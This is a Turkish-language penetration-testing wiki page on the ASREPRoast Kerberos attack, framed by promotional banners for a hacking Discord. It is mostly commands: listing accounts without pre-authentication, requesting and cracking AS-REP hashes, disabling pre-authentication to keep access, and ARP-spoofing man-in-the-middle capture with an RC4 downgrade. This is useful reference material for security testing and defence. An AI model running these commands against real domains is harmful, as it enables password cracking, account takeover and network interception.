# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/image (3).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve bug bounty avcıları ile iletişim kurmak için [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılın!

**Hacking Insights**\
Hacking'in heyecanı ve zorluklarına dalan içeriklerle etkileşimde bulunun

**Real-Time Hack News**\
Hızla değişen hacking dünyasında güncel kalmak için gerçek zamanlı haberler ve içgörülerle takip edin

**Latest Announcements**\
Yeni başlayan bug bounty'ler ve önemli platform güncellemeleri hakkında bilgi sahibi olun

**Bugün en iyi hackerlarla işbirliği yapmak için** [**Discord**](https://discord.com/invite/N3FrSbmwdy) sunucumuza katılın!

## ASREPRoast

ASREPRoast, **Kerberos ön kimlik doğrulama gerektiren özellik** eksik olan kullanıcıları hedef alan bir güvenlik saldırısıdır. Temelde, bu zafiyet, saldırganların kullanıcının şifresine ihtiyaç duymadan Domain Controller (DC) üzerinden bir kullanıcı için kimlik doğrulama talep etmelerine olanak tanır. DC, ardından kullanıcının şifresine dayalı anahtarla şifrelenmiş bir mesajla yanıt verir; saldırganlar bu mesajı çevrimdışı olarak çözmeye çalışarak kullanıcının şifresini keşfetmeye çalışabilirler.

Bu saldırı için ana gereksinimler şunlardır:

- **Kerberos ön kimlik doğrulama eksikliği**: Hedef kullanıcıların bu güvenlik özelliği etkin olmamalıdır.
- **Domain Controller (DC) ile bağlantı**: Saldırganların talepleri göndermek ve şifreli mesajları almak için DC'ye erişimleri olmalıdır.
- **İsteğe bağlı domain hesabı**: Bir domain hesabına sahip olmak, saldırganların LDAP sorguları aracılığıyla savunmasız kullanıcıları daha verimli bir şekilde tanımlamalarını sağlar. Böyle bir hesap olmadan, saldırganlar kullanıcı adlarını tahmin etmek zorundadır.

#### Savunmasız kullanıcıları listeleme (domain kimlik bilgileri gerektirir)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS_REP mesajı isteği
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting ile Rubeus kullanmak, 0x17 şifreleme türü ve 0 ön kimlik doğrulama türü ile bir 4768 oluşturacaktır.

### Kırma
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Süreklilik

**GenericAll** izinlerine (veya özellikleri yazma izinlerine) sahip olduğunuz bir kullanıcı için **preauth** zorunlu değildir:
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
## ASREProast kimlik bilgisi olmadan

Bir saldırgan, Kerberos ön kimlik doğrulamasının devre dışı bırakılmasına güvenmeden, AS-REP paketlerini ağda geçerken yakalamak için bir man-in-the-middle pozisyonu kullanabilir. Bu nedenle, VLAN'daki tüm kullanıcılar için çalışır.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) bunu yapmamıza olanak tanır. Ayrıca, araç, Kerberos müzakeresini değiştirerek istemci iş istasyonlarının RC4 kullanmasını zorlar.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Referanslar

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

---

<figure><img src="../../images/image (3).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve bug bounty avcıları ile iletişim kurmak için [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılın!

**Hacking İçgörüleri**\
Hacking'in heyecanı ve zorluklarına dalan içeriklerle etkileşimde bulunun

**Gerçek Zamanlı Hack Haberleri**\
Gerçek zamanlı haberler ve içgörülerle hızlı tempolu hacking dünyasında güncel kalın

**Son Duyurular**\
Yeni başlayan bug bounty'ler ve önemli platform güncellemeleri hakkında bilgi sahibi olun

Bugün [**Discord**](https://discord.com/invite/N3FrSbmwdy) üzerinden bize katılın ve en iyi hackerlarla işbirliği yapmaya başlayın!

{{#include ../../banners/hacktricks-training.md}}
